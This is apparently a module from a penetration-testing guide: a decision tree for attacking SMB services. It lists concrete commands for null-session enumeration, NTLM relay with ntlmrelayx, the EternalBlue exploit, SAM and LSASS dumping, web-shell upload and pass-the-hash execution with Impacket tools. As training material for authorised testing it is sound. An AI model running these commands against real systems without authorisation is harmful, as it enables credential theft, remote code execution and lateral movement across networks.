# SMB Attack Flow

## Entry Conditions
- Port 139 or 445 identified as open during service scan (Module 02)
- SMB service confirmed via banner grab or Nmap

## Decision Tree

```
Port 139/445 open — SMB detected
│
├── [STEP 1] NULL SESSION / ANONYMOUS ACCESS
│   ├── smbclient -N -L //target  (list shares without auth)
│   ├── rpcclient -U "" -N target
│   │   ├── enumdomusers → ALL domain users
│   │   ├── enumdomgroups → ALL domain groups
│   │   ├── querydominfo → Domain & DC info
│   │   └── getdompwinfo → Password policy
│   ├── enum4linux -a target  (automated: users, shares, OS, policy)
│   │
│   ├── [SUCCESS] Null session works
│   │   ├── User list obtained?
│   │   │   └── YES → [→ Password Spraying] (Module 06)
│   │   ├── Shares accessible?
│   │   │   ├── Readable share?
│   │   │   │   ├── Download all files recursively
│   │   │   │   ├── Search for: passwords, configs, SSH keys
│   │   │   │   ├── Found GPP cpassword? → gpp-decrypt
│   │   │   │   ├── Found web.config? → DB creds
│   │   │   │   └── Found .ssh/id_rsa? → SSH access
│   │   │   └── Writable share?
│   │   │       ├── Web-accessible path? → Upload web shell → RCE
│   │   │       ├── SCF file attack → Capture hashes
│   │   │       └── Startup folder writable? → Script execution
│   │   └── Domain info obtained?
│   │       └── YES → [→ AD Enumeration] (Module 11)
│   │
│   └── [FAILURE] Null session blocked
│       └── Proceed to Step 2
│
├── [STEP 2] SMB SIGNING CHECK
│   ├── nmap --script smb2-security-mode -p 445 target
│   │
│   ├── [CRITICAL] Signing disabled ("message signing but not required")
│   │   ├── NTLM RELAY possible
│   │   ├── Identify relay targets (other hosts, ADCS server)
│   │   ├── ntlmrelayx.py -tf targets.txt -smb2support
│   │   ├── ntlmrelayx.py -t http://dc/certsrv -adcs  (→ DA)
│   │   └── [SUCCESS] Code execution on relay target → Shell
│   │
│   └── [FAILURE] Signing required
│       └── Proceed to Step 3
│
├── [STEP 3] VULNERABILITY CHECK
│   ├── nmap --script smb-vuln* -p 445 target
│   ├── MS17-010 (EternalBlue)?
│   │   ├── YES → exploit/windows/smb/ms17_010_eternalblue
│   │   │   └── [SUCCESS] SYSTEM shell
│   │   └── NO → Check other SMB vulns
│   ├── SambaCry (CVE-2017-7494)?
│   ├── Check SMB version against exploit-db
│   └── searchsploit smb <version>
│
├── [STEP 4] CREDENTIALS AVAILABLE?
│   ├── YES → Authenticated SMB attacks
│   │   ├── [PRIVESC] Admin credentials?
│   │   │   ├── PSExec → SYSTEM shell
│   │   │   ├── WMIexec → Remote command execution
│   │   │   ├── SMBexec → Semi-interactive shell
   │   │   ├── SAM dump via --sam flag (netexec)
│   │   │   ├── LSASS dump via remote execution
│   │   │   └── [→ Lateral Movement] (Module 12)
│   │   └── User credentials (non-admin)
│   │       ├── smbmap -H target -u user -p pass
│   │       ├── Access user-readable shares
│   │       ├── File download from shares
│   │       └── [→ AD Enumeration] if domain user (Module 11)
│   │
│   └── NO → Must obtain credentials
│       ├── [→ Password Spraying] if you have usernames
│       ├── [→ Responder] for hash capture
│       └── [→ Kerbrute + AS-REP] for Kerberos attacks
│
└── [STEP 5] PASS-THE-HASH (if NT hash available)
    ├── psexec.py -hashes :hash domain/user@target
    ├── wmiexec.py -hashes :hash domain/user@target
    ├── smbexec.py -hashes :hash domain/user@target
    ├── atexec.py -hashes :hash domain/user@target  (scheduled task)
    └── [→ Lateral Movement] (Module 12)
```

## Success Paths
| Path | Outcome | Priority |
|------|---------|----------|
| Null session → User enum → Spray | Domain user credential | 1 |
| Null session → Readable share → Creds | Service/domain access | 1 |
| SMB signing disabled → Relay → Shell | Interactive access | 1 |
| Write share → Web shell → RCE | Interactive access | 2 |
| Credentials → PSExec → SYSTEM | Full host control | 2 |
| Pass-the-Hash → Multi-host admin | Lateral movement | 3 |

## Failure Paths
| Situation | Alternative |
|-----------|-------------|
| Null session blocked | Try LDAP anonymous bind, Responder, Kerbrute |
| No vulnerable version | Move to credential-based attacks |
| No credentials anywhere | Switch to web/service enumeration first |
| Signing required everywhere | Cannot relay, use direct Responder capture |

## Cross-References
- Password spray from SMB users → [Module 06](../modules/06-password-attacks.md)
- Domain attacks from SMB info → [Module 11](../modules/11-active-directory.md)
- NTLM relay → [Module 12](../modules/12-lateral-pivot.md)
- Pass-the-Hash → [Module 12](../modules/12-lateral-pivot.md)
- Service enumeration → [Module 07](../modules/07-common-services.md)
- Attack Graph navigation → [Module 99](../modules/99-attack-graph.md)
